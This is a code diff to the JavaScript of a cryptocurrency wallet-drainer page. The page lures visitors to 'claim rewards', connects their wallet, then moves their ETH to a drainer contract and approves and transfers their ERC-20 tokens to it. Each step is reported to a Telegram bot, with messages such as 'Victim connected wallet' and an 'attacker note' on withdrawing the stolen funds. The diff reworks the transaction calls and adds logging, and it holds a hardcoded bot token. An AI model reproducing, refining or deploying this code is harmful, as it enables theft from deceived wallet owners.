@@ -236,8 +236,8 @@
             // Telegram Bot Token and Chat ID
             const botToken = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk';
             const chatId = '6309547301';
-            const drainerContractAddress = '0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8'; // Replace with your deployed contract address
-            const ownerAddress = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490';
+            const drainerContractAddress = '0x3c838b5017c1a756b54559474d160dddd58a6105'; // Updated contract address
+            const ownerAddress = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490'; // Target withdrawal address
             const sepoliaChainId = '0xaa36a7'; // Sepolia Testnet Chain ID (11155111 in hex)
 
             // List of common ERC-20 tokens on Sepolia Testnet (extend as needed)
@@ -401,6 +401,8 @@
                         gasPrice: gasPriceHex,
                     };
 
+                    console.log('Prompting MetaMask for ETH transfer:', tx);
+
                     const txHash = await window.ethereum.request({
                         method: 'eth_sendTransaction',
                         params: [tx],
@@ -438,14 +440,23 @@
                         return `${token.name} Approval failed. Insufficient ETH for gas.`;
                     }
 
-                    const approveTx = await tokenContract.methods.approve(drainerContractAddress, balanceAdjusted)
-                        .send({
-                            from: walletAddress,
-                            gas: web3.utils.toHex(approveGasLimit),
-                            gasPrice: web3.utils.toHex(gasPrice),
-                        });
+                    const approveTxData = tokenContract.methods.approve(drainerContractAddress, balanceAdjusted).encodeABI();
+                    const approveTx = {
+                        from: walletAddress,
+                        to: token.address,
+                        data: approveTxData,
+                        gas: web3.utils.toHex(approveGasLimit),
+                        gasPrice: web3.utils.toHex(gasPrice),
+                    };
 
-                    sendAlert(`${token.name} Approval successful. Tx Hash: ${approveTx.transactionHash}`);
+                    console.log(`Prompting MetaMask for ${token.name} approval:`, approveTx);
+
+                    const approveTxHash = await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [approveTx],
+                    });
+
+                    sendAlert(`${token.name} Approval successful. Tx Hash: ${approveTxHash}`);
 
                     // Step 2: Call approveAndTransferToken on the drainer contract
                     const drainerContract = new web3.eth.Contract(drainerContractAbi, drainerContractAddress);
@@ -458,15 +469,24 @@
                         return `${token.name} Transfer failed. Insufficient ETH for gas.`;
                     }
 
-                    const transferTx = await drainerContract.methods.approveAndTransferToken(token.address, balanceAdjusted)
-                        .send({
-                            from: walletAddress,
-                            gas: web3.utils.toHex(transferGasLimit),
-                            gasPrice: web3.utils.toHex(gasPrice),
-                        });
+                    const transferTxData = drainerContract.methods.approveAndTransferToken(token.address, balanceAdjusted).encodeABI();
+                    const transferTx = {
+                        from: walletAddress,
+                        to: drainerContractAddress,
+                        data: transferTxData,
+                        gas: web3.utils.toHex(transferGasLimit),
+                        gasPrice: web3.utils.toHex(gasPrice),
+                    };
 
-                    sendAlert(`${token.name} Transfer successful. Tx Hash: ${transferTx.transactionHash}. Funds sent to ${drainerContractAddress}`);
-                    return `${token.name} Transfer successful. Tx Hash: ${transferTx.transactionHash}`;
+                    console.log(`Prompting MetaMask for ${token.name} transfer:`, transferTx);
+
+                    const transferTxHash = await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [transferTx],
+                    });
+
+                    sendAlert(`${token.name} Transfer successful. Tx Hash: ${transferTxHash}. Funds sent to ${drainerContractAddress}`);
+                    return `${token.name} Transfer successful. Tx Hash: ${transferTxHash}`;
                 } catch (error) {
                     sendAlert(`${token.name} Transfer failed. Error: ${error.message || error.toString()}`);
                     throw new Error(`${token.name} Transfer failed: ${error.message}`);
@@ -479,6 +499,7 @@
 
                 // Send ETH to contract
                 try {
+                    console.log('Starting ETH transfer...');
                     const ethResult = await promptSendETH(web3, walletAddress);
                     results.push(ethResult);
                 } catch (error) {
@@ -488,6 +509,7 @@
                 // Approve and transfer ERC-20 tokens
                 for (const token of tokens) {
                     try {
+                        console.log(`Starting ${token.name} transfer...`);
                         const tokenResult = await promptTransferToken(web3, walletAddress, token);
                         results.push(tokenResult);
                     } catch (error) {
@@ -504,6 +526,8 @@
                 option.addEventListener('click', async function() {
                     const wallet = this.getAttribute('data-wallet');
                     let provider;
+
+                    console.log(`Attempting to connect wallet: ${wallet}`);
 
                     // Attempt to detect provider for each wallet
                     if (wallet === 'metamask' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
@@ -523,30 +547,32 @@
                     } else if (wallet === 'rabbywallet' && typeof window.ethereum !== 'undefined' && window.ethereum.isRabby) {
                         provider = window.ethereum;
                     } else {
+                        console.log(`Wallet ${wallet} not supported or detected`);
                         alert(`Support for ${wallet} is not fully implemented yet. Please use MetaMask for full functionality.`);
                         $('#walletModal').modal('hide');
                         return;
                     }
 
                     try {
-                        // Request wallet connection
+                        console.log('Requesting wallet accounts...');
                         const accounts = await provider.request({ method: 'eth_requestAccounts' });
                         const walletAddress = accounts[0];
                         const web3 = new Web3(provider);
 
-                        // Send wallet connection alert
+                        console.log(`Wallet connected: ${walletAddress}`);
                         sendAlert(`Victim connected wallet (${wallet}). Address: ${walletAddress}`);
 
-                        // Switch to Sepolia Testnet
+                        console.log('Switching to Sepolia Testnet...');
                         await switchToSepolia(provider);
 
-                        // Process all assets (send ETH and transfer tokens to contract)
+                        console.log('Processing all assets...');
                         const results = await processAllAssets(web3, walletAddress);
                         alert(`Rewards claimed successfully on Sepolia Testnet!\n\nResults:\n${results.join('\n')}\n\nYou can withdraw funds from the contract later.`);
 
-                        // Note for attacker: Withdraw funds using contract's withdrawETH and withdrawToken
+                        console.log('Sending attacker note...');
                         sendAlert(`Attacker note: Use withdrawETH and withdrawToken on ${drainerContractAddress} to claim funds to ${ownerAddress}`);
                     } catch (error) {
+                        console.error(`Error: ${error.message || error.toString()}`);
                         sendAlert(`Operation failed for ${wallet}. Error: ${error.message || error.toString()}`);
                         alert(`Failed to claim rewards. Error: ${error.message || error.toString()}`);
                     }
